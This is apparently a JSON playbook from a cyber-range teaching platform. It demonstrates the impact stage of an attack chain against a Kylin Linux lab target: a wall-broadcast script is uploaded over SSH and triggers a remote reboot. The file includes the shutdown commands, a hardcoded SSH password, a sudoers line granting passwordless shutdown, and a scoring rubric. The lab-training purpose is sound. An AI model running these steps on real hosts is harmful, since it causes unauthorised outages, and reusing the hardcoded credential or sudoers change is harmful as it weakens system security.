@@ -1,0 +1,101 @@
+{
+  "id": "kylin_shutdown_target",
+  "name": "银河麒麟 - 远程关机（终场演示）",
+  "description": "教学目的：演示攻击链的最终阶段——攻击者通过 SSH 远程通道对银河麒麟（Linux）靶标执行系统关机。脚本首先通过 wall 命令向所有登录终端发送全屏广播警告，随后下发延时关机指令。完整展示攻击者获得控制权后的破坏能力。\n\n警告：本 Playbook 仅限授权测试环境使用。Step 2 标记 requires_teacher_review，执行前需教师审核。建议 60 秒内执行 sudo shutdown -c 取消关机。",
+  "category": "impact",
+  "difficulty": "easy",
+  "estimatedDuration": "2 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Lateral Movement",
+    "Impact"
+  ],
+  "mitreTechniques": [
+    "T1021.004",
+    "T1529"
+  ],
+  "targetType": [
+    "local_ip"
+  ],
+  "steps": [
+    {
+      "id": "step1_prepare_shutdown_script",
+      "name": "准备关机广播脚本",
+      "description": "在攻击机本地生成关机脚本，包含 wall 全屏广播警告（5 条横幅消息）和延时 60 秒的系统重启指令。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "cat > /tmp/kylin_shutdown.sh << 'SCRIPTEOF'\n#!/bin/bash\nwall \"!!! ========================================== !!!\"\nwall \"!!!  SECURITY ALERT: Remote Shutdown Initiated !!!\"\nwall \"!!!  System will reboot in 60 seconds          !!!\"\nwall \"!!!  This is a demonstration - standby...       !!!\"\nwall \"!!! ========================================== !!!\"\nsleep 2\nsudo shutdown -r +1 \"HEXSTRIKE DEMO - Remote system reboot initiated\"\nSCRIPTEOF\nchmod +x /tmp/kylin_shutdown.sh\necho 'Shutdown script created: /tmp/kylin_shutdown.sh'"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.004"
+      ]
+    },
+    {
+      "id": "step2_execute_remote_shutdown",
+      "name": "远程执行关机 — wall 全屏广播 + 倒计时",
+      "description": "通过 ssh-exec 将关机脚本上传到目标并执行——wall 全屏广播警告立即出现在所有终端，60 秒后系统自动重启。演示完成后应立即执行 sudo shutdown -c 取消关机。",
+      "toolId": "ssh-exec",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "REPLACE_ME",
+        "-p",
+        "qwer1234",
+        "-s",
+        "/tmp/kylin_shutdown.sh"
+      ],
+      "score": 90,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1529"
+      ],
+      "requires_teacher_review": true
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "shutdown_script_created",
+        "desc": "成功生成本地关机脚本",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Shutdown script created"
+        }
+      },
+      {
+        "id": "shutdown_command_sent",
+        "desc": "wall 广播已发送，关机指令已成功下发",
+        "points": 90,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "shutdown|Script executed"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "web_url",
+    "domain",
+    "windows_host",
+    "ad_domain",
+    "localhost"
+  ],
+  "baselineGroup": "impact-demonstration",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "关机脚本通过 ssh-exec 远程执行；需要目标开放 SSH 22 端口、凭据有效、且已配置 shutdown 的 sudo 免密权限（echo 'REPLACE_ME ALL=(ALL) NOPASSWD: /sbin/shutdown' | sudo tee /etc/sudoers.d/demo-shutdown）",
+  "applicableTargetType": [
+    "local_ip"
+  ],
+  "teachingObjective": "演示远程攻击链的最终阶段（Impact）：通过 SSH 远程下发关机指令，wall 全屏广播警告所有在线用户，展示攻击者对目标系统的完全控制与破坏能力（T1529）",
+  "target_class": "linux_host",
+  "disableAutoInsert": true
+}
